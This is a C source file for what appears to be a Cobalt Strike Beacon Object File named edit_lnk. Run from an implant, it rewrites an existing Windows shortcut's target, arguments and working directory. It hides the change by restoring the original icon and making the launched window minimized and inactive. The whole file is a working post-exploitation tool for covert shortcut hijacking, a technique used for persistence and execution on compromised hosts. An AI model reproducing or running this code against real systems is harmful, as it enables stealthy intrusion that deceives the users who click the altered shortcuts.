#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *str);
DECLSPEC_IMPORT WINBASEAPI void WINAPI OLE32$CoUninitialize();
DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID  rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);

#define CHECK_HRES(x) do { hr = (x); if (FAILED(hr)) { BeaconPrintf(CALLBACK_ERROR, #x " -> 0x%08X\n", hr); goto end; } } while (0)

typedef struct _SHITEMID
{
	USHORT cb;
	BYTE abID[1];
} 	SHITEMID;

typedef struct _ITEMIDLIST
{
	SHITEMID mkid;
} 	ITEMIDLIST;

#define PIDLIST_ABSOLUTE         LPITEMIDLIST
#define PCIDLIST_ABSOLUTE        LPCITEMIDLIST
typedef const ITEMIDLIST __unaligned *LPCITEMIDLIST;
typedef ITEMIDLIST __unaligned *LPITEMIDLIST;

typedef struct _IShellLinkW IShellLinkW;

typedef struct IShellLinkWVtbl
{
	BEGIN_INTERFACE
	HRESULT(STDMETHODCALLTYPE *QueryInterface)(__RPC__in IShellLinkW *This, __RPC__in REFIID riid, _COM_Outptr_  void **ppvObject);
	ULONG(STDMETHODCALLTYPE *AddRef)(__RPC__in IShellLinkW *This);
	ULONG(STDMETHODCALLTYPE *Release)(__RPC__in IShellLinkW *This);
	HRESULT(STDMETHODCALLTYPE *GetPath)(__RPC__in IShellLinkW *This, __RPC__out_ecount_full_string(cch) LPWSTR pszFile, int cch, __RPC__inout_opt WIN32_FIND_DATAW* pfd, DWORD fFlags);
	HRESULT(STDMETHODCALLTYPE *GetIDList)(__RPC__in IShellLinkW *This, __RPC__deref_out_opt PIDLIST_ABSOLUTE *ppidl);
	HRESULT(STDMETHODCALLTYPE *SetIDList)(__RPC__in IShellLinkW *This, __RPC__in_opt PCIDLIST_ABSOLUTE pidl);
	HRESULT(STDMETHODCALLTYPE *GetDescription)(__RPC__in IShellLinkW *This, __RPC__out_ecount_full_string(cch) LPWSTR pszName, int cch);
	HRESULT(STDMETHODCALLTYPE *SetDescription)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszName);
	HRESULT(STDMETHODCALLTYPE *GetWorkingDirectory)(__RPC__in IShellLinkW *This, __RPC__out_ecount_full_string(cch) LPWSTR pszDir, int cch);
	HRESULT(STDMETHODCALLTYPE *SetWorkingDirectory)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszDir);
	HRESULT(STDMETHODCALLTYPE *GetArguments)(__RPC__in IShellLinkW *This, __RPC__out_ecount_full_string(cch) LPWSTR pszArgs, int cch);
	HRESULT(STDMETHODCALLTYPE *SetArguments)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszArgs);
	HRESULT(STDMETHODCALLTYPE *GetHotkey)(__RPC__in IShellLinkW *This, __RPC__out WORD *pwHotkey);
	HRESULT(STDMETHODCALLTYPE *SetHotkey)(__RPC__in IShellLinkW *This, WORD wHotkey);
	HRESULT(STDMETHODCALLTYPE *GetShowCmd)(__RPC__in IShellLinkW *This, __RPC__out int *piShowCmd);
	HRESULT(STDMETHODCALLTYPE *SetShowCmd)(__RPC__in IShellLinkW *This, int iShowCmd);
	HRESULT(STDMETHODCALLTYPE *GetIconLocation)(__RPC__in IShellLinkW *This, __RPC__out_ecount_full_string(cch) LPWSTR pszIconPath, int cch, __RPC__out int *piIcon);
	HRESULT(STDMETHODCALLTYPE *SetIconLocation)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszIconPath, int iIcon);
	HRESULT(STDMETHODCALLTYPE *SetRelativePath)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszPathRel, DWORD dwReserved);
	HRESULT(STDMETHODCALLTYPE *Resolve)(__RPC__in IShellLinkW *This, __RPC__in_opt HWND hwnd, DWORD fFlags);
	HRESULT(STDMETHODCALLTYPE *SetPath)(__RPC__in IShellLinkW *This, __RPC__in_string LPCWSTR pszFile);
	END_INTERFACE
} IShellLinkWVtbl;

typedef struct _IShellLinkW
{
	struct IShellLinkWVtbl *lpVtbl;
} IShellLinkW;

HRESULT EditLnk(LPWSTR pszShortcut, LPWSTR pszTargetFile, LPWSTR pszArgs, LPWSTR pszDirectory)
{
	HRESULT hr;  
	hr = E_INVALIDARG;                                    
	IShellLinkW *psl = NULL;    
	IPersistFile *ppf = NULL; 

	static GUID _CLSID_ShellLink  = { 0X00021401, 0, 0, {0XC0, 0, 0, 0, 0, 0, 0, 0x46} };
	static GUID _IID_IShellLinkW  = { 0x000214F9, 0, 0, {0xC0, 0, 0, 0, 0, 0, 0, 0x46} };
	static GUID _IID_IPersistFile = { 0x0000010b, 0 ,0, {0XC0, 0, 0, 0, 0, 0, 0, 0x46} }; 

	OLE32$CoInitialize(NULL);
	CHECK_HRES(OLE32$CoCreateInstance(&_CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &_IID_IShellLinkW, &psl));
	CHECK_HRES(psl->lpVtbl->QueryInterface(psl, &_IID_IPersistFile, &ppf));
	CHECK_HRES(ppf->lpVtbl->Load(ppf, pszShortcut, STGM_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Loaded %ls\n", pszShortcut);

	// before making changes, grab the icon path and index of the existing lnk file
	int iconIndex = 0;
	wchar_t pszIconPath[MAX_PATH] = {0};
	CHECK_HRES(psl->lpVtbl->GetIconLocation(psl, pszIconPath, MAX_PATH, &iconIndex));

	// set new target path, arguments, and current directory
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting target to: %ls\n", pszTargetFile);
	CHECK_HRES(psl->lpVtbl->SetPath(psl, pszTargetFile)); 
	if (MSVCRT$wcslen(pszArgs) > 0) 
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting arguments to: %ls\n", pszArgs);
		CHECK_HRES(psl->lpVtbl->SetArguments(psl, pszArgs));
	}
	if (MSVCRT$wcslen(pszDirectory) > 0)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting working directory to: %ls\n", pszDirectory);
		CHECK_HRES(psl->lpVtbl->SetWorkingDirectory(psl, pszDirectory));
	}

	CHECK_HRES(psl->lpVtbl->SetShowCmd(psl, SW_SHOWMINNOACTIVE));

	// make sure the original icon path/index are set and save changes
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Setting icon path: %ls | index: %d\n", pszIconPath, iconIndex);
	CHECK_HRES(psl->lpVtbl->SetIconLocation(psl, pszIconPath, iconIndex));
	CHECK_HRES(ppf->lpVtbl->Save(ppf, pszShortcut, TRUE));

end:
	if (psl) psl->lpVtbl->Release(psl);
	if (ppf) ppf->lpVtbl->Release(ppf);
	OLE32$CoUninitialize();
	return (hr);
}

void go (IN PCHAR Buffer, IN ULONG Length)
{
	datap parser = {0};	
	BeaconDataParse(&parser, Buffer, Length);
	const wchar_t *lnk = (const wchar_t *)BeaconDataExtract(&parser, NULL);
	const wchar_t *target = (const wchar_t *)BeaconDataExtract(&parser, NULL);
	const wchar_t *dir = (const wchar_t *)BeaconDataExtract(&parser, NULL); 
	const wchar_t *args = (const wchar_t *)BeaconDataExtract(&parser, NULL); 

	if (lnk == NULL || target == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[X] Usage: edit_lnk <shortcut path> <target path> <args> <working directory>");
		BeaconPrintf(CALLBACK_ERROR, "> shortcut path and target path are required.");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Shortcut: %ls\n", lnk);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %ls\n", target);
	if (args != NULL && MSVCRT$wcslen(args) > 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Arguments: %ls\n", args);
	}
	if (dir != NULL && MSVCRT$wcslen(dir) > 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Working Directory: %ls\n", dir);
	}

	HRESULT hr = EditLnk((LPWSTR)lnk, (LPWSTR)target, (args != NULL) ? (LPWSTR)args : L"", (dir != NULL) ? (LPWSTR)dir : L"");
	if (SUCCEEDED(hr)) {
		BeaconPrintf(CALLBACK_OUTPUT, "\n====== Successfully Modified ======\n");
	} else {
		BeaconPrintf(CALLBACK_ERROR, "[X] Failed: 0x%08X\n", hr);
	}
}